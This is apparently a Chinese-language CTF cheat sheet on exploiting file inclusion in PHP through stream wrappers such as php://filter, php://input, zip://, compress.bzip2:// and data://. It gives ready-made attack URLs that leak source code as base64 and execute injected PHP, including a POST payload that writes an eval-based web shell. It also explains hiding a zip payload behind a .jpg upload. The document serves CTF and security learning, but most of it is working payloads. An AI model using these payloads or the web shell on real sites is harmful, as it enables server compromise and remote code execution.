![img](https://image.3001.net/images/20170925/15063209941952.png)

php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，==php://filter用于读取源码，php://input用于执行php代码。==

###### 【file://协议】

PHP.ini：

file:// 协议在双off的情况下也可以正常使用；

allow_url_fopen ：off/on

allow_url_include：off/on

file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响

使用方法：

file:// [文件的绝对路径和文件名]

> htp://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt

###### php://filter

读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。

PHP.ini：

php://filter在双off的情况下也可以正常使用；

allow_url_fopen ：off/on

allow_url_include：off/on

>
htp://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php

###### php://input

 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。

**PHP.ini：**

allow_url_fopen ：off/on

allow_url_include：on

```
http://127.0.0.1/cmd.php?file=php://input

[POST DATA] <?php phpinfo()?>

也可以POST如下内容生成一句话： 
<?php fputs(fopen("shell.php","w"),'<?php eval($_POST["cmd"];?>');?>
```

###### **【zip://协议】**

**PHP.ini：**

zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；

allow_url_fopen ：off/on

allow_url_include：off/on

==zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。==



```
使用方法：
zip://archive.zip#dir/file.txt

zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]

http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt
```

先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。

由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。

###### **【bzip2://协议】【zlib://协议】**

**使用方法：**

compress.bzip2://file.bz2

```
http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg

or

http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg
```

compress.zlib://file.gz（同理）

###### **【data://协议】**

经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议需要满足双on条件

**PHP.ini：**

data://协议必须双在on才能正常使用；

allow_url_fopen ：on

allow_url_include：on

```
http://127.0.0.1/cmd.php?file=data://text/plain,<?php phpinfo()?>

or

http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

也可以：

http://127.0.0.1/cmd.php?file=data:text/plain,<?php phpinfo()?>

or

http://127.0.0.1/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

